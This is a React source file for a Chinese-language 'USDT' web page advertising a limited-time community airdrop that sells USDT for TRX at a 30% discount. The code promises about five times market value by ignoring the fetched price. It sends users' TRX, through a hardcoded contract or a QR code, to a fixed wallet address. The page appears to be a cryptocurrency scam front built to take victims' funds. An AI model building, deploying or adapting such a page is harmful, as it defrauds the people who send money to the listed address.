import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code';

const App = () => {
  const [trxAmount, setTrxAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [trxPrice, setTrxPrice] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [showQR, setShowQR] = useState(false);
  const [qrString, setQrString] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState('');

  // 收款地址（接收TRX）
  const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';
  // 合约地址（处理USDT购买逻辑）
  const contractAddress = 'TRVCzHHvW6PBXyxjXPTtoHKGyiJw7kThK6';

  useEffect(() => {
    // 检查TronLink连接
    const checkTronLink = async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
      } else {
        const interval = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            setTronWeb(window.tronWeb);
            clearInterval(interval);
          }
        }, 1000);
        return () => clearInterval(interval);
      }
    };
    checkTronLink();

    // 获取TRX实时价格
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
      .then(res => res.json())
      .then(data => setTrxPrice(data.tron?.usd || 0.27))
      .catch(() => setTrxPrice(0.27));
  }, []);

  // 计算可购买的USDT数量
  const calculateUsdt = (trx) => {
    const val = parseFloat(trx);
    if (!val || !trxPrice) return '';
    return (val / 0.7).toFixed(4); // 七折优惠
  };

  // 处理TRX输入变化
  const handleTrxChange = (e) => {
    const val = e.target.value;
    if (/^\d*\.?\d*$/.test(val)) {
      setTrxAmount(val);
      setUsdtAmount(calculateUsdt(val));
      setShowQR(false);
      setTransactionStatus('');
    }
  };

  // 处理购买逻辑
  const handleBuy = async () => {
    const val = parseFloat(trxAmount);
    if (!val || val <= 0) {
      setTransactionStatus('请输入有效的TRX数量');
      return;
    }

    setIsLoading(true);
    setTransactionStatus('');

    if (tronWeb) {
      try {
        // 获取合约实例
        const contract = await tronWeb.contract().at(contractAddress);
        const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6; // USDT 6位小数
        const amountInSun = tronWeb.toSun(val); // 转换为Sun单位

        // 调用合约的buy函数，TRX发送到paymentAddress
        const transaction = await contract.buy(usdtAmountToBuy).send({
          callValue: amountInSun,
          shouldPollResponse: true,
          feeLimit: 100000000, // 设置费用限制
          from: tronWeb.defaultAddress.base58, // 确保发送者是用户钱包地址
          to: paymentAddress, // 明确指定TRX接收地址
        });

        setTransactionStatus(`购买成功！交易ID: ${transaction}`);
        setTrxAmount('');
        setUsdtAmount('');
      } catch (error) {
        console.error(error);
        setTransactionStatus(`购买失败：${error.message || '请重试'}`);
      }
    } else {
      // 如果没有TronLink，生成二维码
      const qrData = `tron:${paymentAddress}?amount=${val.toFixed(6)}`;
      setQrString(qrData);
      setShowQR(true);
      setTransactionStatus('请使用支持TRON的钱包扫描二维码进行支付');
    }

    setIsLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
        {/* Logo & Title */}
        <div className="flex justify-center items-center space-x-3">
          <img
            src="https://i.imgur.com/pNAm2gN.png"
            alt="USDT Logo"
            className="w-10 h-10"
            onError={(e) => (e.target.style.display = 'none')}
          />
          <h1 className="text-2xl font-bold text-gray-800">USDT</h1>
        </div>

        {/* 宣传语 */}
        <p className="text-sm text-yellow-600 font-medium">
          社区空投活动：TRX七折购买USDT（限时优惠）
        </p>

        {/* 实时价格 */}
        <p className="text-lg font-semibold text-gray-700">
          实时价格：${trxPrice?.toFixed(2) || '0.27'} / TRX
        </p>

        {/* 输入框 */}
        <input
          type="text"
          placeholder="输入TRX数量"
          value={trxAmount}
          onChange={handleTrxChange}
          className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        {/* 可购买USDT显示 */}
        <div className="text-sm text-gray-600">
          可购买USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
        </div>

        {/* 购买按钮 */}
        <button
          onClick={handleBuy}
          disabled={isLoading}
          className={`w-full bg-blue-500 text-white text-lg font-semibold py-3 rounded-lg transition ${
            isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-600'
          }`}
        >
          {isLoading ? '处理中...' : '购买'}
        </button>

        {/* 交易状态 */}
        {transactionStatus && (
          <p className={`text-sm ${transactionStatus.includes('成功') ? 'text-green-600' : 'text-red-600'}`}>
            {transactionStatus}
          </p>
        )}

        {/* 二维码展示 */}
        {showQR && qrString && (
          <div className="pt-4 space-y-2">
            <QRCode value={qrString} size={150} className="mx-auto" />
            <p className="text-sm text-gray-500">请使用TRON钱包扫描二维码转账</p>
            <p className="text-xs text-gray-400 break-all">收款地址: {paymentAddress}</p>
            <p className="text-xs text-gray-400">转账金额: {trxAmount} TRX</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
